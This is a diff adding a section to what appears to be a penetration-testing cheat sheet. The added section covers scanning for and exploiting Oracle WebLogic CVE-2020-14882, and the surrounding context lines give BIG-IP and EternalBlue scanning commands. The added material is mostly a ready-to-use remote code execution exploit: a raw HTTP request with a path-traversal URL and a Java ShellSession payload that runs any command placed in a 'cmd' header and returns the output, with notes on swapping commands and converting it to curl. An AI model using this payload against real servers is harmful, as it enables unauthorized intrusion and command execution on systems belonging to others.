@@ -123,6 +123,46 @@ nmap -p443 {IP} --script=http-vuln-cve2020-5902.nse
 ```
 #### BIGIP RCE
 we can use Metasploit Module https://github.com/rapid7/metasploit-framework/pull/13807/commits/0417e88ff24bf05b8874c953bd91600f10186ba4
+
+## Scanning Weblogic CVE-2020-14882
+Nuclei Module
+```bash
+nuclei -t nuclei-templates/cves/CVE-2020-14882.yaml -target http://<IP>
+```
+This module sometimes fails, use -proxy-url http://127.0.0.1:8080 to redirect traffic into Burpsuite and investigate.
+## Exploiting Weblogic CVE-2020-14882 - RCE
+
+```bash
+POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
+Host: 172.16.242.134:7001
+cmd: chcp 65001&&whoami&&ipconfig
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1258
+
+_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();
+weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();
+java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
+field.setAccessible(true);
+Object obj = field.get(adapter);
+weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);
+String cmd = req.getHeader("cmd");
+String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
+if (cmd != null) {
+    String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
+    weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);
+    res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
+    res.getServletOutputStream().flush();
+    res.getWriter().write("");
+}executeThread.interrupt();
+");
+```
+* Change cmd in the request header with any system command(Win/Linux)
+* Payload could be turned into a curl command.
 ## Scanning for EternalBlue ms17-010
 ```bash
 bash$ nmap -p445 --script smb-vuln-ms17-010 <target>/24
